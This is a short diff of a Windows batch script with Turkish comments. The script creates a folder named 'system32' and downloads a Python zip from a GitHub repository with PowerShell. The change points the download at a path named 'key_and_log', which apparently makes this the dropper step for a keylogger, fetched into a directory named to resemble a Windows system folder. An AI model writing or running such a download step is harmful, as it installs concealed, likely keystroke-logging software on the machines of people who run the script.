@@ -12,7 +12,7 @@ if not exist system32 mkdir system32
 cd system32
 
 :: Dosyaları indir
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/Special_Script/raw/main/python.zip' -OutFile 'Python.zip'"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/Special_Script/raw/main/scripts/key_and_log/python.zip' -OutFile 'Python.zip'"
 
 :: py klasörü oluştur ve Python.zip'i çıkar
 mkdir py
